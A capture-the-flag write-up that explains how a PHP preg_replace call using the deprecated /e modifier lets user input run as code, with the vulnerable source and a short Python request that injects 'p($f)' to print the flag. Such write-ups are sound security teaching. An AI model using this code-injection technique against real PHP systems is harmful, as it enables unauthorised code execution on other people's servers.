# Weird Auth 2 - Writeup

## Problem text

Vampire is keen on hacking wierd authentication schemes. He recently pwned this. The source of submit.php is here

## Source for submit.php

```php
<?php

include("auth.php");

$password = $_POST["password"];
$key = $_POST["key"];

// Pretty print
function p($var)
{
  print_r($var);
}

if(!isset($key))
{
  $key = "1c020611e3b753925ffc8af8745c0556";
}
else
{
  if(!is_string($key) || strlen($key)>5)
  {
    p("Unacceptable key!");
    die;
  }
}

$unlockedPassage = preg_replace($password, $key, $lockedPassage);

if($unlockedPassage === $actualPassage)
{
  p("Congrats! you found the correct password :): ");
  p($f); 
}
else
{
  p("You must enter the correct password to get the flag!<br />");
  p($actualPassage);
}
``` 

There is some *evil* code on the login page to trying to divert you from the real issue on this challenge. The following line is where the problem resides: 
```php
$unlockedPassage = preg_replace($password, $key, $lockedPassage);
```
Fortunately we can controll both the $password and the $key, and even more fortunately with little effort we can find out that the php version in which the challenge is running is 5.5.9.

There is a known 'problem' to the preg_replace function in earlier versions of php due to the /e modifier. This modifier documentation is as follows:

```
Warning
This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.
```

What this means is that if you use the /e modifier, replacement string ($key - in our case) will be interpreted as php script :) Fortunately, even with the sanity checks of $key (is_string and length <= 5) vampire left us a way to print out the flag.

```php
 p($f)
```

# Solution
To solve this problem we just need a little python script to make the correct request

```python
import requests
import sys

r = requests.post("http://hack.bckdr.in/WIERD-AUTH2/submit.php", data={'password': '//e', 'key': 'p($f)'})
sys.stdout.write(r.text[:75])
```
And voilá!


